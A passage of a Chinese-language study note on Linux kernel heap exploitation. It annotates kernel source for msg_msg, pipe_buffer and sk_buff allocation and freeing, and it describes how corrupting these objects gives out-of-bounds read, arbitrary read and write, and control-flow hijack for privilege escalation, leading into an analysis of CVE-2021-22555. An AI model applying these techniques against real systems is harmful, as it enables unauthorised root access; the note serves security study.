out_unlock0;\n}\n\n//下面是unlink的部分,如果msg_msg结构被修改了可能会出错的\nlist_del(&msg->m_list);\nmsq->q_qnum--;\nmsq->q_rtime = ktime_get_real_seconds();\nipc_update_pid(&msq->q_lrpid, task_tgid(current));\nmsq->q_cbytes -= msg->m_ts;\natomic_sub(msg->m_ts, &ns->msg_bytes);\natomic_dec(&ns->msg_hdrs);\nss_wakeup(msq, &wake_q, false);\n\ngoto out_unlock0;\n```\n\n使用这个标志位还需要在内核编译的时候设置`CONFIG_CHECKPOINT_RESTORE=y`才行，否则还是会出错的\n\n```c\n//v5.11 /ipc/msgutil.c\n#ifdef CONFIG_CHECKPOINT_RESTORE\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\t//正常的一些数据复制\n}\n#else\n//如果没有设置CONFIG_CHECKPOINT_RESTORE=y则会出错\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\treturn ERR_PTR(-ENOSYS);\n}\n#endif\n```\n\n🔺注：还有一点不知道是不是什么bug，在某些内核版本中，至少我的`v5.11`中，`MSG_NOERROR`和`MSG_COPY`（后续会讲到）没有办法同时生效，关键点在于`copy_msg()`函数中，转化成汇编如下：\n\n![image-20220512163536660](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png)\n\n注意到红框的部分，获取`rdi(msg)`和`rsi(copy)`对应的`m_ts`进行比较，而`copy`的`m_ts`是从用户传进来的想要获取消息的长度，如果小于实际的`msg`的`m_ts`长度，那就标记错误然后退出。可以这个比较应该是在后面才会进行的，但是这里也突然冒出来，就很奇怪，导致这两个标志位没办法同时发挥作用。\n\n##### B.释放堆块的消息读取\n\n同理如果不指定`MSG_COPY`这个标志时，从消息队列中读取消息就会触发内存释放，这里就可以依据发送消息时设置的`mtype`和接收消息时设置的`msgtpy`来进行消息队列中各个位置的堆块的释放。\n\n##### C.数据复制\n\n不管什么标志位，只要不是`MSG_NOERROR`和`MSG_COPY`联合起来，并且申请读取消息长度`size`小于通过`find_msg()`函数获取到的实际消息的`m_ts`，那么最终都会走到do_msgrcv()函数的末尾，通过如下代码进行数据复制和堆块释放\n\n```c\nbufsz = msg_handler(buf, msg, bufsz);\nfree_msg(msg);\n```\n\n### (3)利用\n\n#### 越界读取\n\n这样，当我们通过之前提到的`double-free/UAF`，并且再使用`setxattr`来对`msg_msgmsg`中的`m_ts`进行修改，这样在我们调用`msgrcv`的时候就能越界从堆上读取内存了，就可能能够泄露到堆地址或者程序基地址。\n\n**使用`setxattr`的时候需要注意释放堆块时FD的位置，不同内核版本开启不同保护下FD的位置不太一样**\n\n为了获取到地址的成功性更大，我们就需要用到单个`msg_queue`和单个`msg_msg`的内存模型\n\n![image-20220511113542467](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png)\n\n可以看到单个`msg_msg`在`msg_queue`的管理下形成双向循环链表，所以如果我们通过`msgget`和`msgsnd`多申请一些相同大小的且只有一个`msg_msg`结构体的`msg_queue`，那么越界读取的时候，就可以读取到只有单个`msg_msg`的头部了\n\n而单个`msg_msg`由于双向循环链表，其头部中又存在指向`msg_queue`的指针，那么这样就能泄露出`msg_queue`的堆地址了。\n\n\n\n#### 任意读取\n\n完成上述泄露`msg_queue`的堆地址之后，就需要用到`msg_msg`的内存布局了\n\n由于我们的`msg_msg`消息的内存布局如下\n\n![5IcVxRaFQtg3HCW](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png)\n\n相关读取源码如下：\n\n```c\n//v4.9----ipc/msgutil.c\n#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n#define DATALEN_SEG\t((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))\n----------------------------------------------------------------\nint store_msg(void __user *dest, struct msg_msg *msg, size_t len)\n{\n\tsize_t alen;\n\tstruct msg_msgseg *seg;\n\n\talen = min(len, DATALEN_MSG);\n\tif (copy_to_user(dest, msg + 1, alen))\n\t\treturn -1;\n\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tdest = (char __user *)dest + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_to_user(dest, seg + 1, alen))\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n```\n\n所以如果我们可以修改`next`指针和`m_ts`，结合读取`msg`最终调用函数`store_msg`的源码，那么就能够实现任意读取。\n\n那么接着上面的，我们得到`msg_queue`之后，可以再将`msg_msg`的next指针指回`msg_queue`，读出其中的`msg_msg`，就能获得当前可控堆块的堆地址。\n\n这样完成之后，我们结合`userfaultfd`和`setxattr`频繁修改next指针就能基于当前堆地址来进行内存搜索了，从而能够完成地址泄露。\n\n同时需要注意的是，判断链表是否结束的依据为next是否为null，所以我们任意读取的时候，最好找到一个地方的next指针处的值为null。\n\n#### 任意写\n\n同样的，`msg_msg`由于next指针的存在，结合`msgsnd`也具备任意地址写的功能。我们可以在拷贝的时候利用`userfaultfd`停下来，然后更改next指针，使其指向我们需要的地方，比如`init_cred`结构体位置，从而直接修改进行提权。\n\n## 2.pipe管道---kmalloc-1024/kmalloc-192\n\n参照：[(31条消息) Linux系统调用：pipe()系统调用源码分析_rtoax的博客-CSDN博客_linux pipe 源码](https://blog.csdn.net/Rong_Toa/article/details/116270704)****\n\n通常来讲，管道用来在父进程和子进程之间通信，因为`fork`出来的子进程会继承父进程的文件描述符副本。这里就使用当前进程来创建管道符，从管道的读取端(`pipe_fd[0]`)和写入端(`pipe_fd[1]`)来进行利用。\n\n### (1)使用方法\n\n#### ①创建\n\n```c\n#include <unistd.h>\n\n//使用pipe或者pipe2\nint pipe_fd[2];\n\npipe(pipe_fd);//默认阻塞状态\n//pipe2(pipe_fd,flag);\n```\n\n其中`pipe2`函数或者系统调用`__NR_pipe2`的`flag`支持除0之外的三种模式，可用在`man`手册中查看。\n\n如果传入的`flag`为0，则和`pipe`函数是一样的，是阻塞的。\n\n阻塞状态：即当没有数据在管道中时，如果还调用`read`从管道读取数据，那么就会使得程序处于阻塞状态，其他的也是类似的情况。\n\n会默认创建两个fd文件描述符的，该fd文件描述符效果的相关结构如下\n\n```c\n//v5.9  /fs/pipe.c\nconst struct file_operations pipefifo_fops = {\n\t.open\t\t= fifo_open,\n\t.llseek\t\t= no_llseek,\n\t.read_iter\t= pipe_read,\n\t.write_iter\t= pipe_write,\n\t.poll\t\t= pipe_poll,\n\t.unlocked_ioctl\t= pipe_ioctl,\n\t.release\t= pipe_release,\n\t.fasync\t\t= pipe_fasync,\n};\n```\n\n放入到`pipe_fd`中，如下\n\n```c\nint pipe_fd[2];\npipe(pipe_fd);\n\nprintf(\"pipe_fd[0]:%d\\n\",pipe_fd[0]);\nprintf(\"pipe_fd[1]:%d\\n\",pipe_fd[1]);\n```\n\n效果如下：\n\n![image-20220509161948796](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png)\n\n之后使用`write/read`来写入读取即可，注意写入端为`fd[1]`，读取端为`fd[0]`\n\n```c\nchar buf[0x8] = {0};\nchar* msg = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";\nwrite(pipe_fd[1],msg,0x8);\nread(pipe_fd[0],buf,0x8);\n```\n\n\n\n#### ②释放\n\n由于`pipe`管道创建后会对应创建文件描述符，所以释放两端对应的文件描述符即可释放管道`pipe`管道\n\n```c\nclose(pipe_fd[0]);\nclose(pipe_fd[1]);\n```\n\n需要将两个文件描述符fd都给释放掉或者使用`read`将管道中所有数据都读取出来，才会进入`free_pipe_info`函数来释放在线性映射区域申请的相关内存资源，否则还是不会进入的。\n\n\n\n### (2)内存分配与释放\n\n#### ①分配\n\n发生在调用`pipe`/`pipe2`函数，或者系统调用`__NR_pipe`/`__NR_pipe2`时，内核入口为\n\n```c\nSYSCALL_DEFINE2(pipe2, int __user *, fildes, int, flags)\n{\n\treturn do_pipe2(fildes, flags);\n}\n\nSYSCALL_DEFINE1(pipe, int __user *, fildes) /* pipe() 系统调用 */\n{\n\treturn do_pipe2(fildes, 0);\n}\n```\n\n函数调用链：\n\n```\ndo_pipe2()->__do_pipe_flags()->create_pipe_files()->get_pipe_inode()->alloc_pipe_info()\n```\n\n调用之后会在内核的线性映射区域进行内存分配，也就是常见的内核堆管理的区域。分配点在如下函数中：\n\n```c\n//v5.9 /fs/pipe.c\nstruct pipe_inode_info *alloc_pipe_info(void)\n{\n\tstruct pipe_inode_info *pipe;\n\tunsigned long pipe_bufs = PIPE_DEF_BUFFERS;\n\n    //#define PIPE_DEF_BUFFERS\t16\n    //.....\n    //pipe_inode_info管理结构，大小为0xa0，属于kmalloc-192\n\tpipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);\n\tif (pipe == NULL)\n\t\tgoto out_free_uid;\n\n    //.....\n    //相关的消息结构为pipe_buffer数组,总共16*0x28=0x280,直接从kmalloc-1024中拿取堆块\n\tpipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),\n\t\t\t     GFP_KERNEL_ACCOUNT);\n    \n    //.....\n\t//对申请的pipe管道进行一些初始化\n\tif (pipe->bufs) {\n\t\tinit_waitqueue_head(&pipe->rd_wait);\n\t\tinit_waitqueue_head(&pipe->wr_wait);\n\t\tpipe->r_counter = pipe->w_counter = 1;\n\t\tpipe->max_usage = pipe_bufs;\n\t\tpipe->ring_size = pipe_bufs;\n\t\tpipe->nr_accounted = pipe_bufs;\n\t\tpipe->user = user;\n\t\tmutex_init(&pipe->mutex);\n\t\treturn pipe;\n\t}\n\n    //.....\n    //出错的话则会释放掉，具体干啥的不太清楚\nout_free_uid:\n\tfree_uid(user);\n\treturn NULL;\n}\n```\n\n相关的`pipe_inode_info`结构如下\n\n```c\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_inode_info {\n\tstruct mutex mutex;\n\twait_queue_head_t rd_wait, wr_wait;\n\tunsigned int head;\n\tunsigned int tail;\n\tunsigned int max_usage;\n\tunsigned int ring_size;\n#ifdef CONFIG_WATCH_QUEUE\n\tbool note_loss;\n#endif\n\tunsigned int nr_accounted;\n\tunsigned int readers;\n\tunsigned int writers;\n\tunsigned int files;//文件描述符计数，都为0时才会释放管道\n\tunsigned int r_counter;\n\tunsigned int w_counter;\n\tstruct page *tmp_page;\n\tstruct fasync_struct *fasync_readers;\n\tstruct fasync_struct *fasync_writers;\n    //pipe_buffer数组,16个,每个大小为0xa0,通常我们从这上面泄露地址或者劫持程序流\n\tstruct pipe_buffer *bufs;\n\tstruct user_struct *user;\n#ifdef CONFIG_WATCH_QUEUE\n\tstruct watch_queue *watch_queue;\n#endif\n};\n```\n\n\n\n#### ②释放\n\n直接使用`close`函数释放管道相关的文件描述符fd两端。\n\n函数链调用链：\n\n```\npipe_release()->put_pipe_info()->free_pipe_info()\n```\n\n需要注意的时，在`put_pipe_info`函数中\n\n```c\n//v5.9 /fs/pipe.c\nstatic void put_pipe_info(struct inode *inode, struct pipe_inode_info *pipe)\n{\n\tint kill = 0;\n\n\tspin_lock(&inode->i_lock);\n\tif (!--pipe->files) {\n\t\tinode->i_pipe = NULL;\n\t\tkill = 1;\n\t}\n\tspin_unlock(&inode->i_lock);\n\n    //当files为0才会进入该函数\n\tif (kill)\n\t\tfree_pipe_info(pipe);\n}\n```\n\n只有`pipe_inode_info`这个管理结构中的`files`成员为0，才会进行释放，也就是管道两端都关闭掉才行。\n\n相关释放函数`free_pipe_info`\n\n```c\n//v5.9 /fs/pipe.c\nvoid free_pipe_info(struct pipe_inode_info *pipe)\n{\n\tint i;\n    //....\n    //和管道相关的释放有关，也是相关的漏洞点\n\tfor (i = 0; i < pipe->ring_size; i++) {\n\t\tstruct pipe_buffer *buf = pipe->bufs + i;\n\t\tif (buf->ops)\n\t\t\tpipe_buf_release(pipe, buf);\n\t}\n    //......\n    //释放pipe_buffer数组,kmalloc-1024\n\tkfree(pipe->bufs);\n    //释放pipe_inode_info管理结构,kmalloc-192\n\tkfree(pipe);\n}\n```\n\n\n\n### (3)利用\n\n#### ①信息泄露\n\n`pipe_buffer`结构的`buf`\n\n```c\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_buffer {\n\tstruct page *page;\n\tunsigned int offset, len;\n\tconst struct pipe_buf_operations *ops;\n\tunsigned int flags;\n\tunsigned long private;\n};\n```\n\n其中的`ops`成员，即`struct pipe_buf_operations`结构的`pipe->bufs[i]->ops`，其中保存着全局的函数表，可通过这个来泄露内核基地址，相关结构如下所示\n\n```C\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_buf_operations {\n\tint (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tvoid (*release)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tbool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tbool (*get)(struct pipe_inode_info *, struct pipe_buffer *);\n};\n```\n\n#### ②劫持程序流\n\n当关闭了管道的两端时，调用到`free_pipe_info`函数，在清理`pipe_buffer`时进入如下判断：\n\n```c\nif (buf->ops)\n    pipe_buf_release(pipe, buf);\n```\n\n当管道中存在未被读取的数据时，即我们需要调用`write`向管道的写入端写入数据\n\n```c\n//v5.9 /fs/pipe.c\nstatic ssize_t\n    pipe_write(struct kiocb *iocb, struct iov_iter *from)\n{\n    //......\n    struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];\n    //......\n    buf = &pipe->bufs[head & mask];\n    buf->page = page;\n    buf->ops = &anon_pipe_buf_ops;\n    buf->offset = 0;\n    buf->len = 0;\n    //......\n\n}\n```\n\n然后不要将数据全部读取出来，如果全部读取出来的话，那么在`read`对应的`pipe_read`函数中就会如下情况\n\n```c\n//v5.9  /fs/pipe.c\nstatic ssize_t\n    pipe_read(struct kiocb *iocb, struct iov_iter *to)\n{\n    //....\n    struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];\n    //....\n    if (!buf->len) {\n        pipe_buf_release(pipe, buf);\n        //....\n    }\n    //....\n}\n```\n\n从而调用`pipe_buf_release`将`buf->ops`清空。\n\n🔺注：（其实这里既然调用到了`pipe_buf_release`函数，那么我们直接通过`read`将管道`pipe`中的所有数据读取出来，其实也能执行该`release`函数指针的，从而劫持程序控制流的。）\n\n那么接着上述的情况，那么在关闭两端时`buf->ops`这个函数表就会存在\n\n![image-20220509192251738](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png)\n\n而当`buf->ops`这个函数表存在时，关闭管道符两端进入上述判断之后，就会调用到其中的`pipe_buf_release`函数，该函数会调用到这个`buf->ops`函数表结构下对应的`relase`函数指针，该指针在上述的`pipe_buf_operations`结构中有提到\n\n![image-20220509193945468](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png)\n\n那么如果劫持了`buf->ops`这个函数表，就能控制到`release`函数指针，从而劫持控制流程。\n\n不过`pipe`管道具体的保存的数据放在哪里，还是不太清楚，听`bsauce`说是在`struct pipe_buffer`结构下`buf`的`page`里面，但是没有找到，后续还需要继续看看，先mark一下。这样也可以看出来，每写入一条信息时，内核的`kmalloc`对应的堆内存基本是不发生变化的，与下面提到的`sk_buff`有点不同。\n\n## 3.sk_buff---kmalloc-512及以上\n\n参考：[(31条消息) socketpair的用法和理解_雪过无痕_的博客-CSDN博客_socketpair](https://blog.csdn.net/weixin_40039738/article/details/81095013)\n\n和该结构体相关的是一个`socketpair`系统调用这个也算是`socket`网络协议的一种，但是是在本地进程之间通信的，而非在网络之间的通信。说到底，这个其实和`pipe`非常像，也是一个进程间的通信手段。不过相关区分如下：\n\n- 数据传输模式\n  - `pipe`：单工，发送端`fd[1]`发送数据，接收端`fd[0]`接收数据\n  - `socketpair`：全双工，同一时刻两端均可发送和接收数据，无论信道中的数据是否被接收完毕。\n- 模式\n  - `pipe`：由`flag`来定义不同模式\n  - `socketpair`：默认阻塞状态\n\n此外在《Linux系统编程手册》一书中提到，`pipe()`函数实际上被实现成了一个对`socketpair`的调用。\n\n### (1)使用方法\n\n#### ①创建\n\n```c\n#include <sys/socket.h>\n\n//默认必须\nint socket_fd[2];\n//domain参数必须被指定为AF_UNIX,不同的\nint sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, 0, socket_fd);\nif( sockPair_return < 0){\n    perror( \"socketpair()\" );\n    exit(1);\n}\n```\n\n然后和`pipe`管道一样，使用`write/read`即可，不过这个的fd两端都可以写入读取，但是消息传递的时候一端写入消息，就需要从另一端才能把消息读取出来\n\n```c\nchar buf[0x8] = {0};\nchar* msg = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";\nwrite(socket_fd[0],msg,0x8);\nread(socket_fd[1],buf,0x8);\n```\n\n#### ②释放\n\n```c\nclose(socket_fd[0]);\nclose(socket_fd[1]);\n```\n\n可以看到和`pipe`是很相似的。\n\n### (2)内存分配与释放\n\n在调用`socketpair`这个系统调用号时，并不会进行相关的内存分配，只有在使用`write`来写入消息，进行数据传输时才会分配。\n\n#### ①分配\n\n在调用`write`进行数据写入时\n\n函数链：\n\n```c\nwrite -> ksys_write() -> vfs_write() -> new_sync_write() -> call_write_iter() -> sock_write_iter() -> sock_sendmsg() -> sock_sendmsg_nosec() -> unix_stream_sendmsg()->内存申请/数据复制\n```\n\n在`unix_stream_sendmsg`开始分叉\n\n```c\n//v5.9 /net/unix/af_unix.c\nstatic int unix_stream_sendmsg(struct socket *sock, struct msghdr *msg,\n\t\t\t       size_t len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct sock *other = NULL;\n\tint err, size;\n\tstruct sk_buff *skb;\n\tint sent = 0;\n\tstruct scm_cookie scm;\n\tbool fds_sent = false;\n\tint data_len;\n\t//.....\n\twhile (sent < len) {\n\t\tsize = len - sent;\n\t\t/* Keep two messages in the pipe so it schedules better */\n\t\tsize = min_t(int, size, (sk->sk_sndbuf >> 1) - 64);\n\t\t/* allow fallback to order-0 allocations */\n\t\tsize = min_t(int, size, SKB_MAX_HEAD(0) + UNIX_SKB_FRAGS_SZ);\n\t\tdata_len = max_t(int, 0, size - SKB_MAX_HEAD(0));\n\t\tdata_len = min_t(size_t, size, PAGE_ALIGN(data_len));\n        //------------------分叉一:内存申请部分\n\t\tskb = sock_alloc_send_pskb(sk, size - data_len, data_len,\n\t\t\t\t\t   msg->msg_flags & MSG_DONTWAIT, &err,\n\t\t\t\t\t   get_order(UNIX_SKB_FRAGS_SZ));\n        //相关检查部分\n\t\tif (!skb)\n\t\t\tgoto out_err;\n\t\t/* Only send the fds in the first buffer */\n\t\terr = unix_scm_to_skb(&scm, skb, !fds_sent);\n\t\tif (err < 0) {\n\t\t\tkfree_skb(skb);\n\t\t\tgoto out_err;\n\t\t}\n\t\t//.....\n        //----------------------分叉二:数据复制部分\n\t\tskb_put(skb, size - data_len);\n\t\tskb->data_len = data_len;\n\t\tskb->len = size;\n        //这里开始进行数据复制\n\t\terr = skb_copy_datagram_from_iter(skb, 0, &msg->msg_iter, size);\n\t\tif (err) {\n\t\t\tkfree_skb(skb);\n\t\t\tgoto out_err;\n\t\t}\n        //.....\n\t\tsent += size;\n\t}\n\t//......\n\n\treturn sent;\nout_err:\n\tscm_destroy(&scm);\n\treturn sent ? : err;\n}\n```\n\n##### A.内存申请\n\n先进行相关内存申请，即`sock_alloc_send_pskb() -> alloc_skb_with_frags() -> alloc_skb() -> __alloc_skb()`\n\n还是挺长的，但是最重要的还是最后的`__alloc_skb`函数，\n\n```c\n//v5.9 /net/core/skbuff.c\nstruct sk_buff *__alloc_skb(unsigned int size, gfp_t gfp_mask,\n\t\t\t    int flags, int node)\n{\n\tstruct kmem_cache *cache;\n\tstruct skb_shared_info *shinfo;\n\tstruct sk_buff *skb;\n\tu8 *data;\n\tbool pfmemalloc;\n\n\tcache = (flags & SKB_ALLOC_FCLONE)\n\t\t? skbuff_fclone_cache : skbuff_head_cache;\n\n\tif (sk_memalloc_socks() && (flags & SKB_ALLOC_RX))\n\t\tgfp_mask |= __GFP_MEMALLOC;\n\n\t/* Get the HEAD */\n    //从专门的缓存池skbuff_fclone_cache/skbuff_head_cache中申请内存\n    //作为头部的管理结构\n\tskb = kmem_cache_alloc_node(cache, gfp_mask & ~__GFP_DMA, node);\n\tif (!skb)\n\t\tgoto out;\n\t//......\n    //先对齐，这个和L1_CACHE_BYTES有关,64位系统即和64(0x40)对齐,32位类似，具体的还是查一下最好\n\tsize = SKB_DATA_ALIGN(size);\n    //size += 对齐之后的0x140\n    //那么size只可能是0x140+n*0x40,最低为0x180,属于kmalloc-512\n\tsize += SKB_DATA_ALIGN(sizeof(struct skb_shared_info));\n    \n    //虽然是kmalloc_reserve函数，但是最终还是kmalloc形式\n    //调用到`__kmalloc_node_track_caller`函数进行分配\n    //这个data即为我们实际的存储数据的地方,也是从kmalloc申请出的堆块\n    //并且是从对开的开头位置处开始存储,完成内存申请后返回unix_stream_sendmsg函数\n    //在`skb_copy_datagram_from_iter`函数中数据会被复制\n\tdata = kmalloc_reserve(size, gfp_mask, node, &pfmemalloc);\n\tif (!data)\n\t\tgoto nodata;\n\t//...\n\tsize = SKB_WITH_OVERHEAD(ksize(data));\n\t//....\n    //初始化头部的管理结构\n\tmemset(skb, 0, offsetof(struct sk_buff, tail));\n\t/* Account for allocated memory : skb + skb->head */\n\tskb->truesize = SKB_TRUESIZE(size);\n\tskb->pfmemalloc = pfmemalloc;\n\trefcount_set(&skb->users, 1);\n\tskb->head = data;\n\tskb->data = data;\n\tskb_reset_tail_pointer(skb);\n\tskb->end = skb->tail + size;\n\tskb->mac_header = (typeof(skb->mac_header))~0U;\n\tskb->transport_header = (typeof(skb->transport_header))~0U;\n\t//...\nout:\n\treturn skb;\nnodata:\n\tkmem_cache_free(cache, skb);\n\tskb = NULL;\n\tgoto out;\n}\n```\n\n###### 内存申请总结：\n\n- `sk_buff`为数据的管理结构从专门的缓存池`skbuff_fclone_cache/skbuff_head_cache`中申请内存，没办法进行控制\n- `skb->data`为实际的数据结构\n  - `size`：`0x140+n*0x40`(0x40的倍数补齐)。即如果传入的数据长度为0x3f，则n为1，传入数据为0x41，则n为2。\n  - 堆块申请：走`kmalloc`进行申请，比较常见的种类，方便堆喷。\n- 每调用`wirte`函数写入一次数据，都会走一遍流程，申请新的`sk_buff`和`skb->data`，不同消息之间相互独立。\n\n##### B.数据复制\n\n相关内存申请完成之后，回到`unix_stream_sendmsg`函数，开始进行数据复制`skb_copy_datagram_from_iter`，即上述提到的。\n\n```c\n//v5.9 /net/core/datagram.c\nint skb_copy_datagram_from_iter(struct sk_buff *skb, int offset,\n                                struct iov_iter *from,\n                                int len)\n{\n    int start = skb_headlen(skb);\t\t\t// skb->len - skb->data_len;\n    int i, copy = start - offset;\t\t\t// copy 是线性数据区的剩余空间大小\n    struct sk_buff *frag_iter;\n    //拷贝到申请的保存数据的堆块skb->data\n    if (copy > 0) {\n        if (copy > len)\n            copy = len;\n        if (copy_from_iter(skb->data + offset, copy, from) != copy)\n            goto fault;\n        if ((len -= copy) == 0)\n            return 0;\n        offset += copy;\n    }\n    //....\n}\n```\n\n\n\n#### ②释放\n\n当从`socker`套接字中读取出某条信息的所有数据时，就会发生该条信息的相关内存的释放，即该条信息对应`sk_buff`和`skb->data`的释放。同样的，如果该条信息没有被读取完毕，则不会发生该信息相关内存的释放。\n\n在`read`时进行的函数调用链：\n\n```\nread -> ksys_read() -> vfs_read() -> new_sync_read() -> call_read_iter() -> sock_read_iter() -> sock_recvmsg() -> sock_recvmsg_nosec() -> unix_stream_recvmsg() -> unix_stream_read_generic()\n```\n\n同样的在`unix_stream_read_generic`处开始分叉，也是分为两部分，下面截取重要部分\n\n```c\n//v5.9 /net/unix/af_unix.c\nstatic int unix_stream_read_generic(struct unix_stream_read_state *state,\n\t\t\t\t    bool freezable)\n{\n    //....\n\tdo {\n        //....\n\t\tchunk = min_t(unsigned int, unix_skb_len(skb) - skip, size);\n\t\tskb_get(skb);\n        //------------------分叉一:数据复制\n        //recv_actor函数指针是在unix_stream_recvmsg函数中定义的state函数表\n        //该函数指针对应unix_stream_read_actor函数,即从这开始进行数据复制\n\t\tchunk = state->recv_actor(skb, skip, chunk, state);\n        //...\n        //传输数据完成之后,skb->users从2改为1,表示已经复制完数据了,方便后续判断\n        //消息中是否还有数据\n\t\tconsume_skb(skb);\n\t\tif (chunk < 0) {\n\t\t\tif (copied == 0)\n\t\t\t\tcopied = -EFAULT;\n\t\t\tbreak;\n\t\t}\n\t\tcopied += chunk;\n\t\tsize -= chunk;\n\n\t\t/* Mark read part of skb as used */\n\t\tif (!(flags & MSG_PEEK)) {\n            //修改skb类型转换之后对应的consumed字段,其实就是skb->cb某个位置处的数据\n            //#define UNIXCB(skb)\t(*(struct unix_skb_parms *)&((skb)->cb))\n\t\t\tUNIXCB(skb).consumed += chunk;\n\t\t\t//依据上面的consumed和len来判断消息中是否还剩下没有传输的数据\n            //有(1)则break,无(0)则进入后续的内存释放阶段\n\t\t\tif (unix_skb_len(skb))\n\t\t\t\tbreak;\n            //------------------------分叉二:内存释放\n            //内存释放前置工作\n\t\t\tskb_unlink(skb, &sk->sk_receive_queue);\n            //进入该函数,通过对于skb->users的判断之后,进入内存释放阶段\n\t\t\tconsume_skb(skb);\n            //....................\n\t} while (size);\n        //......................\nout:\n\treturn copied ? : err;\n}\n```\n\n##### A.数据复制\n\n之后的函数调用链为\n\n```\nunix_stream_read_actor() -> skb_copy_datagram_msg() -> skb_copy_datagram_iter() -> __skb_datagram_iter()\n```\n\n最终进入`__skb_datagram_iter`，\n\n```c\n//v5.9 /net/core/datagram.c\nstatic int __skb_datagram_iter(const struct sk_buff *skb, int offset,\n\t\t\t       struct iov_iter *to, int len, bool fault_short,\n\t\t\t       size_t (*cb)(const void *, size_t, void *,\n\t\t\t\t\t    struct iov_iter *), void *data)\n{\n\tint start = skb_headlen(skb);\n\tint i, copy = start - offset, start_off = offset, n;\n\tstruct sk_buff *frag_iter;\n\n\t/* Copy header. */\n    //这个header指的就是数据data,大概就是从这里开始实际的数据\n\tif (copy > 0) {\n\t\tif (copy > len)\n\t\t\tcopy = len;\n\t\tn = INDIRECT_CALL_1(cb, simple_copy_to_iter,\n\t\t\t\t    skb->data + offset, copy, data, to);\n\t\toffset += n;\n\t\tif (n != copy)\n\t\t\tgoto short_copy;\n\t\tif ((len -= copy) == 0)\n\t\t\treturn 0;\n\t}\n    //......\n    /* Copy paged appendix. Hmm... why does this look so complicated? */\n    //linux内核维护人员都看不下去了,xs\n    //......\n}\n```\n\n这里使用了感觉很复杂的机制，不是很懂。\n\n##### B.内存释放\n\n进入内存释放的函数调用链为\n\n- 释放`skb->data`部分：\n\n  ```\n  consume_skb()->__kfree_skb()->skb_release_all()->skb_release_all()->skb_release_data()->skb_free_head()\n  ```\n\n  对应函数如下：\n\n  ```c\n  //v5.9 /net/core/skbuff.c\n  static void skb_free_head(struct sk_buff *skb)\n  {\n      //其实head和data是一样的\n  \tunsigned char *head = skb->head;\n  \tif (skb->head_frag) {\n  \t\tif (skb_pp_recycle(skb, head))\n  \t\t\treturn;\n  \t\tskb_free_frag(head);\n  \t} else {\n  \t\tkfree(head);\n  \t}\n  }\n  ```\n\n  可以看到使用的正常的`kfree`函数\n\n- 释放`skb`部分：\n\n  ```\n  consume_skb()->__kfree_skb()->kfree_skbmem()\n  ```\n\n  相关函数如下\n\n  ```c\n  //v5.9 /net/core/skbuff.c\n  static void kfree_skbmem(struct sk_buff *skb)\n  {\n      struct sk_buff_fclones *fclones;\n      //克隆体相关的,没有fork之类的话一般不用太管的\n      switch (skb->fclone) {\n          case SKB_FCLONE_UNAVAILABLE:\n              //用专门的cache(skbuff_head_cache)进行回收\n              kmem_cache_free(skbuff_head_cache, skb);\n              return;\n  \n          case SKB_FCLONE_ORIG:\n              fclones = container_of(skb, struct sk_buff_fclones, skb1);\n  \n              /* We usually free the clone (TX completion) before original skb\n  \t\t * This test would have no chance to be true for the clone,\n  \t\t * while here, branch prediction will be good.\n  \t\t */\n              if (refcount_read(&fclones->fclone_ref) == 1)\n                  goto fastpath;\n              break;\n  \n          default: /* SKB_FCLONE_CLONE */\n              fclones = container_of(skb, struct sk_buff_fclones, skb2);\n              break;\n      }\n      if (!refcount_dec_and_test(&fclones->fclone_ref))\n          return;\n  fastpath:\n      //用专门的cache(skbuff_fclone_cache)进行回收克隆的skb\n      kmem_cache_free(skbuff_fclone_cache, fclones);\n  }\n  \n  ```\n\n  这个就不太好利用了。\n\n  同样的，当关闭的信道的两端，该信道内产生的所有的`sk_buff`和`skb->data`都会得到释放\n\n##### 内存释放总结：\n\n- 当从信道中将某条消息全部读取完之后，会发生该条消息对应的`sk_buff`和`skb->data`的内存释放，且`sk_buff`释放到专门的缓存池中，`skb->data`使用正常的`kfree`释放\n\n- 当关闭信道两端，该信道内产生的所有的`sk_buff`和`skb->data`都会得到释放，具体的调用链为：\n\n  ```\n  sock_close()->__sock_release()->unix_release()->__kfree_skb()\n  ```\n\n  后面就类似了。\n\n# 一、漏洞分析\n\n## 前言\n\n由于我编译环境的时候老是出问题（后面才解决的），所以直接拿`bsauce`师傅提供的环境来用了，但是又没有带DEBUG的`vmlinux`，所以我使用[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf.git)简单获取下符号就开始逆向了(xs)，所以下面漏洞分析提到的地址为`bsauce`师傅环境的地址。\n\n[CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 